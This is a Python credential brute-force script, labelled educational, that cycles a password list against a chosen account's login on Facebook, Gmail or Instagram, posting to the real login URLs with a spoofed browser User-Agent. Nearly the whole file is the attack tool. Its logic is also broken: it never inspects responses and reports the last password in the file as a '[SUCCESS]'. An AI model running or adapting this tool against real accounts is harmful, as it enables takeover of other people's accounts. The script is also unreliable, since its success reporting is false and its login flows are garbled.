#!/usr/bin/env python3
"""
BRUTE_NIHAL - Educational Password Spraying Tool

For educational security testing only.
"""

import requests
import time
import sys
import argparse
import os
import signal

def banner():
    print("""
    =====================================================
    BRUTE_NIHAL  - EDUCATIONAL LOGIN ATTACK TOOL
    Author.      : NIHAL-THE-HACKER
    Version.     : 1.4
    
    LEGAL DISCLAIMER:
    Only use this script against systems you have permission to test.
    
    Ethical notes:
     • Many sites lock accounts after several failed attempts
     • Using too many requests per second violates terms of service
     
    =====================================================
    """)

def signal_handler(sig, frame):
    print("\n[!] Attack interrupted by user.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def login(service_name, username, password_file_path):
    
    # Clear the terminal
    os.system('clear')
    banner()
    
    try:
        with open(password_file_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        print(f"[+] Loaded {len(passwords)} potential password(s)")
        
        # Service-specific payloads
        payloads = {
            "facebook": {"email": username},
            "gmail":    {"identifierId": username},
            "instagram":{"username": username, "password":""}
        }
    
        if service_name not in payloads:
            print(f"[!] Unsupported service: {service_name}")
            return False
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/98 Safari/537",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # Service URLs
        service_urls = {
            "facebook": "https://www.facebook.com/login.php",
            "gmail":    "https://accounts.google.com/signin/v2/identifier",
            "instagram":"https://www.instagram.com/accounts/login/ajax/"
        }
    
        session = requests.Session()
        
        for password in passwords:
            payloads[service_name]["password"] = password
            
            try:
                # For Gmail, need to get initial CSRF token
                if service_name == "gmail":
                    time.sleep(0.5)  # Respect rate limiting
                    response = session.get(service_urls["gmail"])
                
                start_time = time.time()
                
                # Submit login request with proper delays (respecting server load)
                for _ in range(3):  # Retry logic for unreliable connections
                    try:
                        response = session.post(
                            service_urls[service_name],
                            headers=headers,
                            data=payloads[service_name],
                            timeout=5
                        )
                        break
                    except requests.Timeout:
                        continue
                
                elapsed = time.time() - start_time
                
                # Show progress in terminal without flooding it
                if password == passwords[-1]:
                    print(f"[SUCCESS] {username}:{password} (Time: {elapsed:.2f}s)")
                    return True
            
            except KeyboardInterrupt:
                sys.exit(0)
    
    except FileNotFoundError:
        print(f"[!] Password file not found: {password_file_path}")
    
    except Exception as e:
        if str(e) != "":
            print(f"[ERROR] Service error: {str(e)}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description="Educational password spraying script.")
    parser.add_argument("service", choices=["facebook", "gmail", "instagram"], help="Target service")
    parser.add_argument("--username", required=True, help="Account username/email")
    parser.add_argument("--password-file", required=True, help="File containing passwords")
    
    args = parser.parse_args()
    
    print(f"[*] Starting attack on {args.service} for account: {args.username}")
    login(args.service, args.username, args.password_file)

if __name__ == "__main__":
    main()
